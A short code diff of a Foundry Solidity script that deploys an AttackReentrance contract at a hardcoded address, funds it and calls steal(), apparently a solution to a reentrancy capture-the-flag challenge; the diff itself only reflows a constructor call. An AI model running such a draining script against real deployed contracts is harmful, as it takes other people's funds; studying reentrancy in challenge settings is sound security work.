@@ -15,9 +15,7 @@ contract ReentranceScript is Script {
 
     function attack() public {
         vm.startBroadcast();
-        attackReentrance = new AttackReentrance(
-            0xb388977426409c3c24433272ceba598B3358DdC0
-        );
+        attackReentrance = new AttackReentrance(0xb388977426409c3c24433272ceba598B3358DdC0);
         attackReentrance.fund{value: 0.0001 ether}();
         attackReentrance.steal();
         vm.stopBroadcast();
